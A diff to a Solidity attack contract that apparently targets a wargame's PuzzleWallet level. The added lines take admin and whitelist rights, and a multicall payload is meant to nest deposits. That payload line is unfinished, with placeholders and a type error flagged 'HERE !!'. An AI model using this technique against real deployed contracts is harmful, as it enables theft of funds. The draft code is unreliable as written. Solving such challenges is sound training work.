@@ -8,12 +8,14 @@ contract Attack24 {
 
     constructor(address _targetAddress) {
         target = PuzzleWallet(_targetAddress);
+        target.proposeNewAdmin(msg.sender);
+        target.addToWhitelist(msg.sender);
     }
 
     function attack() public {
         // multicall attack
-        bytes[] memory data = abi.encodeWithSelector(bytes4, arg);
-        // set the data argument as a abi encoded call to deposit
+        bytes[] memory data = abi.encodeWithSelector(bytes4, arg);   //   <--  HERE !!
+        // set the data argument as a abi encoded multicall to deposit
         (bool success, ) = target.multicall(data);
     }
 }
